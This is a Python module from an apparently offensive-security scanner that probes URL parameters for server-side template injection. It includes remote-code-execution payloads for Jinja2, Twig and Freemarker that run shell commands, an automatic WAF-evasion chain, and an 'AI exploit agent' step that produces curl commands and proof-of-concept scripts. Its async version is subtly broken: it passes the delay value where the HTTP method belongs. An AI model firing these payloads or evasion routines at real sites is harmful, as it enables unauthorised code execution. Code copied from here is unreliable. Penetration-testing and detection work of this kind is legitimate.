"""
cyberm4fia-scanner - Server-Side Template Injection (SSTI) Scanner
Detects Jinja2, Twig, Mako, Smarty, Freemarker, Pebble template injection
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from utils.colors import log_info, log_success
from utils.request import smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# SSTI Payloads — each has a unique expected output
# ─────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    # Jinja2 / Twig (Python / PHP)
    {"payload": "{{7*7}}", "expect": "49", "engine": "Jinja2/Twig"},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "Jinja2 (Python)"},
    {"payload": "${7*7}", "expect": "49", "engine": "Freemarker/Mako"},
    {"payload": "#{7*7}", "expect": "49", "engine": "Ruby ERB / Java EL"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "ERB / ASP"},
    {"payload": "{7*7}", "expect": "49", "engine": "Smarty"},
    {"payload": "{{config}}", "expect": "Config", "engine": "Jinja2 (Flask)"},
    # Math-based confirmation payloads
    {"payload": "{{4*4*4*4}}", "expect": "256", "engine": "Jinja2/Twig"},
    {"payload": "${4*4*4*4}", "expect": "256", "engine": "Freemarker/Mako"},
    {"payload": "#{4*4*4*4}", "expect": "256", "engine": "Java EL"},
]

# RCE escalation payloads (after detection, for evidence)
SSTI_RCE_PAYLOADS = {
    "Jinja2 (Python)": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "Jinja2/Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Freemarker/Mako": [
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
}

def inject_payload(url, param, payload, delay, method="get"):
    """Inject SSTI payload into a URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        params[param] = [""]

    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    try:
        if method == "get":
            resp = smart_request("get", test_url, delay=delay, timeout=8)
        else:
            data = {param: payload}
            resp = smart_request("post", url, data=data, delay=delay, timeout=8)

        return resp.text, resp.status_code
    except ScanExceptions:
        return None, None

def scan_ssti(url, delay=0):
    """Scan URL for SSTI vulnerabilities."""
    log_info(f"Starting SSTI scan on {url}")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        log_info("No parameters found for SSTI testing")
        return findings

    for param in params:
        log_info(f"Testing parameter: {param}")
        param_found = False
        waf_blocked = False

        for entry in SSTI_PAYLOADS:
            payload = entry["payload"]
            expected = entry["expect"]
            engine = entry["engine"]

            body, status = inject_payload(url, param, payload, delay)
            if body is None:
                continue

            # Track WAF blocks for AI bypass later
            if status in (403, 406, 429, 503):
                waf_blocked = True

            # Check if the mathematical result appears in response
            if expected in body:
                # Verify it's not already in the normal page
                clean_body, _ = inject_payload(
                    url, param, "harmless_test_string", delay
                )
                if clean_body and expected not in clean_body:
                    finding = {
                        "type": "SSTI",
                        "url": url,
                        "field": param,
                        "payload": payload,
                        "engine": engine,
                        "evidence": f"Response contains '{expected}'",
                        "severity": "CRITICAL",
                        "description": (
                            f"Server-Side Template Injection in '{param}' parameter. "
                            f"Engine: {engine}. This can lead to Remote Code Execution."
                        ),
                    }
                    findings.append(finding)
                    log_success(
                        f"[CRITICAL] SSTI found! Param: {param} | "
                        f"Engine: {engine} | Payload: {payload}"
                    )
                    param_found = True
                    break  # One confirmed finding per param is enough

        # ── 3-tier WAF bypass for this param (auto-tamper → AI → protocol) ──
        # Mirror the original module's conservative gate: only run the
        # bypass chain when a specific WAF actually fingerprinted.
        from utils.waf import waf_detector as _waf_detector
        _waf_name_seed = getattr(_waf_detector, "detected_waf", "") or ""
        if not param_found and waf_blocked and _waf_name_seed:
            try:
                from utils.waf import waf_detector
                from utils.waf_evasion import apply_waf_bypass_chain

                waf_name = _waf_name_seed
                base_payload = "{{7*7}}"
                parsed_for_bypass = urlparse(url)
                base_params = parse_qs(parsed_for_bypass.query, keep_blank_values=True)
                if param not in base_params:
                    base_params[param] = [""]

                def request_fn(p, *, evasion_level=0):
                    base_params[param] = [p]
                    new_query = urlencode(base_params, doseq=True)
                    test_url = urlunparse(parsed_for_bypass._replace(query=new_query))
                    try:
                        return smart_request(
                            "get",
                            test_url,
                            delay=delay,
                            timeout=8,
                            evasion_level=evasion_level,
                        )
                    except ScanExceptions:
                        return None

                def check_fn(response, p, source):
                    if response is None:
                        return None
                    body = getattr(response, "text", "") or ""
                    if "49" not in body:
                        return None
                    clean_body, _ = inject_payload(
                        url, param, "harmless_test_string", delay
                    )
                    if not clean_body or "49" in clean_body:
                        return None
                    finding = {
                        "type": "SSTI",
                        "url": url,
                        "field": param,
                        "payload": p,
                        "engine": "WAF Bypass Chain",
                        "evidence": f"Response contains '49' ({source})",
                        "severity": "CRITICAL",
                        "description": (
                            f"SSTI in '{param}' via {source}. WAF: {waf_name}"
                        ),
                    }
                    log_success(
                        f"[CRITICAL] SSTI WAF bypass! Param: {param} | {source}"
                    )
                    return finding

                # Probe once with the base payload to seed blocked_response
                seed = request_fn(base_payload)
                if seed is not None:
                    bypass_finding = apply_waf_bypass_chain(
                        payload=base_payload,
                        blocked_response=seed,
                        request_fn=request_fn,
                        check_fn=check_fn,
                        waf_name=waf_name,
                        vuln_label="SSTI",
                    )
                    if bypass_finding:
                        findings.append(bypass_finding)
                        param_found = True
            except (ImportError, ScanExceptions):
                pass

    # ── AI Exploit Agent (Final Escalation) ──
    if not findings and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for param in params:
                    ctx = ExploitContext(
                        url=url,
                        param=param,
                        vuln_type="SSTI",
                        waf=waf_name,
                        http_method="GET",
                    )
                    result = agent.exploit_ssti(ctx)
                    if result and result.success:
                        findings.append({
                            "type": "SSTI",
                            "url": url,
                            "field": param,
                            "payload": result.payload,
                            "engine": "AI-detected",
                            "evidence": result.evidence[:200],
                            "severity": "CRITICAL",
                            "description": (
                                f"AI-discovered SSTI in '{param}' parameter. "
                                f"Confidence: {result.confidence:.0f}%"
                            ),
                            "source": f"AI Agent (Gen-{result.iteration})",
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        log_success(
                            f"[CRITICAL] SSTI in: {param} "
                            f"[AI Agent Gen-{result.iteration}]"
                        )
                        break
        except ImportError:
            pass

    log_success(f"SSTI scan complete. Found {len(findings)} vulnerability(ies).")
    return findings


# ── Async version ─────────────────────────────────────────────────────────

async def async_scan_ssti(url, delay=0):
    """Async version of scan_ssti — uses async HTTP for non-blocking I/O."""
    from utils.async_request import async_smart_request, get_async_client

    log_info(f"Starting SSTI scan (async) on {url}")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        log_info("No parameters found for SSTI testing")
        return findings

    async with get_async_client() as client:

        async def _inject(param, payload, method="get"):
            p = parse_qs(urlparse(url).query, keep_blank_values=True)
            if param not in p:
                p[param] = [""]
            p[param] = [payload]
            new_query = urlencode(p, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                if method == "get":
                    resp = await async_smart_request(client, "get", test_url, delay=delay, timeout=8)
                else:
                    resp = await async_smart_request(client, "post", url, data={param: payload}, delay=delay, timeout=8)
                return resp.text, resp.status_code
            except ScanExceptions:
                return None, None

        for param in params:
            log_info(f"Testing parameter: {param}")

            for entry in SSTI_PAYLOADS:
                payload = entry["payload"]
                expected = entry["expect"]
                engine = entry["engine"]

                body, status = await _inject(param, payload, delay)
                if body is None:
                    continue

                if expected in body:
                    clean_body, _ = await _inject(param, "harmless_test_string", delay)
                    if clean_body and expected not in clean_body:
                        finding = {
                            "type": "SSTI",
                            "url": url,
                            "field": param,
                            "payload": payload,
                            "engine": engine,
                            "evidence": f"Response contains '{expected}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"Server-Side Template Injection in '{param}' parameter. "
                                f"Engine: {engine}. This can lead to Remote Code Execution."
                            ),
                        }
                        findings.append(finding)
                        log_success(
                            f"[CRITICAL] SSTI found! Param: {param} | "
                            f"Engine: {engine} | Payload: {payload}"
                        )
                        break

    log_success(f"SSTI scan (async) complete. Found {len(findings)} vulnerability(ies).")
    return findings
